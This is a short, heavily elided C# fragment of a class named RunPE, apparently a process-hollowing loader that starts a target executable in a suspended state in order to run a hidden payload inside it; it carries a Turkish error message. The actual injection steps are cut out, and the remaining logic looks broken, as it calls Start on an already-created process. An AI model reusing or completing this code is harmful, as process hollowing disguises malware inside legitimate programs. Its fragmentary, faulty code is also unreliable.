...
namespace RunPE
{
    public static class RunPE
    {
        ...
        public static void Execute(string path, byte[] payload)
        {
            ...
            try
            {
                if (!CreateProcessA(path, null, IntPtr.Zero, IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, ref pi))
                ...
                int threadId = Process.GetProcessById((int)pi.ProcessId).Threads[0].Id;
                threadHandle = OpenThread(ThreadAccess.QueryInformation, false, (uint)threadId);

                if (threadHandle == IntPtr.Zero)
                    throw new Exception("Thread handle alınamadı.");

                Process process = Process.GetProcessById((int)pi.ProcessId);
                process.Start();
            }
            catch (Exception ex)
            {
